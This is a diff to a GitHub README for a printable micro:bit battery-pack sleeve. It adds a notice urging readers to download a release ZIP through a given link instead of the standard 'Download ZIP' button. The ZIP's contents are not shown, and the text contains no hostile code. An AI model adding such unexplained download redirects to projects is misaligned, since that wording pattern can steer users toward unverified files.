@@ -1,4 +1,9 @@
 # microbit_sleeve
+
+ ## Important
+### To download the latest stable version, please click below instead of using the "Download ZIP" button.
+### [Click here to download](https://github.com/arm-university/microbit_sleeve/releases/download/v2.0.0/microbit_sleeve-main.zip)
+
 A printable branded sleeve used to attach a micro:bit to a battery pack securely.
 
 ## License
